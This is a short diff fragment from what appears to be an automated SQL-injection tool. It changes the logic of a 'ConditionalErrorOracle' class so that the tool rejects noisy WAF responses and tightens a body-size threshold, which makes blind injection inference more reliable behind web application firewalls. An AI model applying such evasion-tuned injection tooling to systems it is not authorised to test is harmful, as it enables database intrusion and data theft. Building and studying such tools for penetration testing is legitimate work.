+                            LOG.debug("[ErrorOracle] Skipping body-size oracle: "
+                                      "true=%d and false=%d are same WAF status — "
+                                      "body-size variation is WAF noise, not SQL signal",
+                                      _t_st, _f_st)
+                            continue  # try next template instead of accepting noisy oracle
                         if (_t_st in _ceo_cal_waf and _t_st < 500
                                 and _t_st != self._baseline_status):
                             # Still try body-size mode before skipping
@@ -164843,7 +165064,15 @@ class ConditionalErrorOracle:
                             and self._true_oracle_status == self._false_oracle_status
                             and _ceo_resp_sc == self._true_oracle_status):
                         _oracle_range = max(abs(self._true_oracle_size - self._false_oracle_size), 1)
-                        if min(_to_true, _to_false) > _oracle_range * 0.50:
+                        # FIX-CEO-PROXIMITY-THRESHOLD: tighten from 0.50 to 0.25.
+                        # When the symmetric WAF case fires (both calibrated statuses same),
+                        # WAF pages vary randomly in size. A 50% tolerance was too wide —
+                        # it accepted probe sizes anywhere in a 50% band around the oracle
+                        # range, letting noisy WAF responses leak through as True/False.
+                        # 25% is tight enough to reject random WAF-page-size variation while
+                        # still accepting genuine oracle signal (which clusters near one of
+                        # the two calibrated sizes, typically within 15% of the range).
+                        if min(_to_true, _to_false) > _oracle_range * 0.25:
                             return None  # probe body size outside oracle signal range — ambiguous
                     return _to_true < _to_false
                 if (_ceo_sc in _ceo_waf_codes
